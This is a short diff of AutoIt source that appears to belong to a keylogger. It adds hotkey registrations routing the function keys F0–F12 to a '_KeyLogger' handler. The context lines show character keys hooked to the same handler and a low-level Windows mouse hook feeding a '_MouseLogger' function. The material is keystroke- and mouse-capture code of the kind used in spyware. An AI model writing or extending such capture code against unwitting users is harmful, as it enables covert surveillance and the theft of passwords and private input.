@@ -46,6 +46,10 @@ func InitKeyHooks()
 		HotKeySet(Chr($i), "_KeyLogger")
 	next
 	
+	for $i = 0 to 12
+		HotKeySet("{F" & $i & "}", "_KeyLogger")
+	next
+	
 	$mouse_func = DllCallbackRegister("_MouseLogger", "int", "int;ptr;ptr")
 	$hmod = _WinAPI_GetModuleHandle(0)
 	$hook = _WinAPI_SetWindowsHookEx($WH_MOUSE_LL, DllCallbackGetPtr($mouse_func), $hmod)
